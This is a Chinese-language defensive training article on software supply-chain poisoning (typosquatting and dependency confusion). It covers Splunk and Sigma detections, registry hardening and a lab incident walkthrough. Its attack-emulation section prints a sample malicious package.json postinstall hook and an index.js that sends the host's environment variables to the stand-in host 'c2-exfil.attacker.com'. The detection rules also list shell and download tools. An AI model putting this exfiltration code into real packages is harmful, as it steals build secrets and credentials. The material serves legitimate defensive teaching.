# 04.1 開源依賴投毒與相依性混淆防護 (Supply Chain Dependency Confusion & Typosquatting)

## 案發現場破題

在現代軟體工程與 DevSecOps 流水線中，企業高度仰賴第三方開源套件庫（如 npm, PyPI, Maven, NuGet, Go Modules）。攻擊者已將目光由傳統的「漏洞利用」轉向「供應鏈上游投毒（Supply Chain Poisoning）」。其中最常見且極具破壞力的兩種手法為：
1. **錯字搶注（Typosquatting）**：註冊與知名合法開源套件名稱極為相似的惡意套件（例如將 `requests` 拼寫為 `requsts` 或 `cross-env` 拼寫為 `crossenv`），等待工程師在打字手滑時誤裝惡意程式。
2. **相依性混淆（Dependency Confusion, Alex Birsan 攻擊模型）**：利用套件管理器（如 npm 或 pip）的解析偏好機制——當同名套件同時存在於企業內部私有 Repo 與公有公共 Registry 時，套件管理器預設會優先下載「版本號較高（Higher Version）」的套件。攻擊者遂在公開 Registry 搶先發布標註為 `99.0.0` 的同名惡意套件，誘騙企業 CI/CD 流水線自動拉取並執行任意代碼。

```
[企業內部開發環境 / CI/CD 構建伺服器]
       │
       ├── 執行構建: npm install 或 pip install
       │
       ▼ 【套件管理器版本解析演算法】
 ┌─────────────────────────────────────────────────────────────┐
 │ 內部私有套件庫 (Nexus / Artifactory) : @corp/auth v1.2.0     │
 │ 外部公開套件庫 (npmjs.org / pypi.org) : @corp/auth v99.0.0    │ ◄── 攻擊者惡意投毒
 └─────────────────────────────────────────────────────────────┘
       │
       ▼ (預設採用版本號較高者)
 惡意套件被下載並於 postinstall / setup.py 階段執行任意惡意 Shellcode
       │
       └── 竊取開發環境環境變數 (.env, AWS_KEY, GITHUB_TOKEN) 偷渡回傳至 C2
```

### 痛點場景
- **構建期直接 RCE（Build-time Remote Code Execution）**：許多套件生態系支援在安裝當下自動觸發執行檔（如 npm 的 `preinstall` / `postinstall` 生命週期腳本，或 Python 的 `setup.py`），使工程師或自動化 Runner 在單純下載套件時即遭滲透。
- **內部專案命名容易外洩**：企業內部專案使用的私有套件名稱常透過開源前端程式碼、反編譯之客戶端檔案、或外洩之 `package.json` 被攻擊者輕易窺探。
- **簽章機制缺位**：大部分企業並未強制驗證套件發行者身分（如 Sigstore / Cosign），對依賴項的真實來源缺乏雙向認證。

## 第一動：投毒機制與相依性混淆剖析 (Poisoning Mechanics & Weaponization)

```
+-----------------------------------------------------------------------------------------------+
| 軟體供應鏈投毒主要攻擊手法                                                                     |
|                                                                                               |
| 1. Typosquatting (錯字搶注)                                                                   |
|    - 攻擊前置：分析套件下載排行榜，註冊名稱發音或鍵盤鄰近鍵之偽造套件 (例: collorama vs colorama)|
|    - 武器化時機：安裝時觸發惡意腳本，並在背景同時載入原合法套件以掩蓋異常行為。                |
|                                                                                               |
| 2. Dependency Confusion (相依性混淆 / Namespace Confusion)                                    |
|    - 攻擊前置：偵測企業未註冊 Namespace (例: 未在 npmjs 註冊 @corp 組織範圍名稱)               |
|    - 武器化時機：發布超大版本號 (如 999.0.0)，利用 pip/npm 預設優先拉取高版本之特性。        |
|                                                                                               |
| 3. Account Hijacking / Compromised Maintainer (維護者帳號遭劫持)                              |
|    - 攻擊前置：竊取原合法開源專案維護者之 GitHub / npm 帳號憑證或 API Token                    |
|    - 武器化時機：直接在合法套件之最新補丁中注入隱蔽後門 (如著名的 event-stream / xz-utils 事件) |
+-----------------------------------------------------------------------------------------------+
```

### 惡意套件常見行為特徵

| 威脅面向 | 惡意套件特徵與行為指標 (IoA) | 防禦阻斷標準 |
| :--- | :--- | :--- |
| **安裝鉤子 (Lifecycle Hooks)** | `package.json` 中包含 `preinstall`, `install`, `postinstall` 執行外部 curl / bash / powershell。 | 於 CI/CD 中強制啟用 `--ignore-scripts` 參數。 |
| **環境變數竊取** | 讀取 `process.env` 或 `os.environ`，特別針對 `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, `SSH_AUTH_SOCK`。 | 嚴格隔離構建環境之 Secret 注入，啟用 OIDC 動態憑證。 |
| **外部外聯 (Exfiltration)** | 透過 DNS Tunneling (發送高頻子網域查詢) 或 HTTP POST 將 Base64 編碼之憑證傳送至非官方伺服器。 | 構建伺服器預設斷開未經許可之出向網際網路連線。 |

## 第二動：惡意投毒攻擊鏈模擬與檢驗 (Attack Emulation: Poisoned Package)

### 1. 典型的惡意 `package.json` 投毒樣板
攻擊者建立名為 `@corp-internal/payment-core` 的套件，在 `package.json` 中宣告安裝執行命令：
```json
{
  "name": "@corp-internal/payment-core",
  "version": "99.1.0",
  "description": "Internal payment gateway wrapper",
  "scripts": {
    "postinstall": "node index.js"
  }
}
```

### 2. `index.js` 竊密腳本特徵
```javascript
const os = require('os');
const https = require('https');

const leakData = JSON.stringify({
    hostname: os.hostname(),
    username: os.userInfo().username,
    env: process.env
});

const req = https.request({
    hostname: 'c2-exfil.attacker.com',
    port: 443,
    path: '/leak',
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Content-Length': leakData.length
    }
});
req.write(leakData);
req.end();
```

## 第三動：套件庫安全配置與監控遙測 (Telemetry & Registry Hardening)

### 1. 私有套件庫隔離原則 (Nexus / Artifactory 專屬設定)
- **禁止公開倉庫路由覆蓋**：在私有倉庫中，將企業內部 Scope（如 `@corp/*`）設定為 **「僅限本地存取（Local Only）」**，嚴禁在本地找不到時轉發請求至公有 npmjs.org。
- **公有倉庫鏡像代理（Virtual Repository）檢查**：強制所有外部套件必須經過安全掃描與審核才能進入快取。

### 2. CI/CD 端點進程監控 (Sysmon Telemetry)
監控套件安裝程序是否衍生出異常的子程序（如 `npm` 衍生 `curl.exe`、`powershell.exe` 或 `bash`）：
- **Sysmon Event ID 1 (Process Creation)**：
  - `ParentImage`: `*npm*`, `*node.exe*`, `*python.exe*`
  - `Image`: `*powershell.exe*`, `*cmd.exe*`, `*curl.exe*`, `*bash*`

## 第四動：SIEM 關聯規則與即時獵捕 (Splunk & Sigma Detection)

### 1. Splunk SPL：偵測構建程序衍生出未預期的外部外聯與指令碼執行
```spl
index=sysmon sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
    ParentImage IN ("*\\npm.cmd", "*\\node.exe", "*\\python.exe", "*\\pip.exe")
    Image IN ("*\\powershell.exe", "*\\cmd.exe", "*\\curl.exe", "*\\certutil.exe")
| stats count earliest(_time) as first_time latest(_time) as last_time 
        values(CommandLine) as ExecutedCmds by Computer, User, ParentImage, Image
| convert ctime(first_time) ctime(last_time)
| table first_time, last_time, Computer, User, ParentImage, Image, ExecutedCmds
```

### 2. Splunk SPL：偵測套件管理器下載高異常版本號
```spl
index=cicd_logs sourcetype="npm:audit"
| rex field=package_info "(?<pkg_name>[^\s]+)@(?<pkg_version>\d+\.\d+\.\d+)"
| eval MajorVersion=tonumber(mvindex(split(pkg_version, "."), 0))
| where MajorVersion >= 50
| table _time, repo_name, pkg_name, pkg_version, user
```

### 3. Sigma 偵測規則：Suspicious Process Spawned by Package Manager
```yaml
title: Suspicious Process Spawned by Package Manager Postinstall
id: e48b2910-14cc-429a-9e12-884129b015ac
status: production
description: 偵測 npm, pip 等套件安裝程序在執行期間異常拉起 shell 或外部下載工具
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        ParentImage|endswith:
            - '\node.exe'
            - '\npm.cmd'
            - '\python.exe'
            - '\pip.exe'
        Image|endswith:
            - '\powershell.exe'
            - '\cmd.exe'
            - '\curl.exe'
            - '\wget.exe'
    condition: selection
falsepositives:
    - 合法編譯本機 C++ 模組 (如 node-gyp 呼叫 MSBuild)
level: high
```

## 第五動：軟體供應鏈治理與防禦落地 (Supply Chain Hardening & Mitigation)

```
[開發者電腦 / CI 伺服器] ──► [企業私有套件代理 (Private Proxy)]
                                     │
                                     ├── 1. 命名空間保留 (Namespace Reservation)
                                     ├── 2. 嚴格鎖定版本哈希 (Lockfiles with Integrity Hashes)
                                     ├── 3. 禁止安裝前執行腳本 (--ignore-scripts)
                                     ▼
                      [通過安全審查 ➔ 允許編譯發布]
```

### 1. 強制採用鎖定檔案與雜湊校驗 (Lockfiles Integrity)
- 在專案中**強制提交** `package-lock.json` 或 `poetry.lock`，並於 CI/CD 構建時強制使用：
  ```bash
  # npm 使用 clean install，若 lockfile 與 package.json 不一致則立即報錯退出
  npm ci --ignore-scripts
  ```
- 啟用 `--ignore-scripts`，阻止任何第三方套件在 `npm install` 期間自動執行 postinstall 代碼。

### 2. 搶先在公開 Registry 註冊企業命名空間 (Namespace Reservation)
- 在 `npmjs.org` 與 `pypi.org` 上以企業官方身分建立 Organization，將所有內部私有前綴（如 `@company-name`）全數註冊並聲明保留，使外部未授權者無法註冊同名前置套件。

### 3. 本機套件安全掃描 (npm audit & pip-audit)
在 CI/CD 流水線中加入自動化阻斷步驟：
```bash
# 自動偵測已知惡意套件與漏洞
pip-audit --desc on
npm audit --audit-level=high
```

## 靶場實戰：相依性混淆攻擊演練與排查

### 靶場環境情境
- **企業私有套件庫**: `http://nexus.corp.local/repository/npm-group/`
- **受害專案**: 企業金融交易核心 `payment-gateway`
- **警報觸發**: SOC 監控發現 GitHub Actions Runner 於深夜執行構建時，主動發送 DNS 請求至 `*.data-exfil.xyz`。

### 實戰步驟一：分析 `package-lock.json` 異常
1. 檢視該次構建產出的 `package-lock.json`：
   發現 `@corp/crypto-utils` 的 `resolved` 欄位指向 `https://registry.npmjs.org/@corp/crypto-utils/-/crypto-utils-99.0.0.tgz`，而非內部 Nexus 伺服器。
2. 確認發生 **Dependency Confusion**，外部公開倉庫發布的高版本覆蓋了內部的 `1.0.4`。

### 實戰步驟二：清除與阻斷
1. 立即在 Nexus 套件庫中修改 Routing Rules，將 `@corp/*` 設為 Block External。
2. 廢除所有可能外洩之 GitHub Actions Secrets（包含雲端 API 金鑰）。
3. 將 `npm install` 改寫為 `npm ci --ignore-scripts`。
